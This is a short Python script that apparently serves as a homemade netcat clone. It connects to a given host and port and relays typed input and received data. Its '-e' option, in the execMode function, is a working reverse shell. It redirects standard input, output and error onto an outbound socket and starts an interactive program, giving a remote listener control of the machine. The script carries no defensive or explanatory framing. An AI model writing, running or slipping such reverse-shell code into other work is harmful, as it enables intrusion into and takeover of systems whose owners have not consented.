#!/usr/bin/env python

import socket
import sys

import threading
import time
import argparse

exitFlag = 0

class myThread(threading.Thread):
    def __init__(self, threadID, name):
        threading.Thread.__init__(self,daemon=True)
        self.threadID = threadID
        self.name = name
    def run(self):
         sendLoop()

def receiveLoop():
    while True:
        data = sock.recv(4096)
        if len(data) == 0:
            print("socket closed by remote end")
            break
        else:
            print(str(data))

def sendLoop():
    while True:
        myinput = input()
        sock.sendall(bytes(myinput+"\n",'utf-8'))

def execMode(host,port,binary):
    import socket,subprocess,os

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call([binary,"-i"])

parser = argparse.ArgumentParser(description="Simple nc in python")
parser.add_argument('host', metavar='HOST', type=str, help='The destination host to connect to')
parser.add_argument('port', metavar='PORT', type=int, help='The destination port to connect to')
parser.add_argument('-e',dest='binary',default=None,help="Execute the following command interractively")

args = parser.parse_args()

if args.binary is not None:
    execMode(args.host,args.port,args.binary)

sock = socket.socket()
sock.connect((sys.argv[1],int(sys.argv[2])))
print("Connected")

# Create new threads
thread1 = myThread(1, "Thread-1")

# Start sendThread
thread1.start()

receiveLoop()
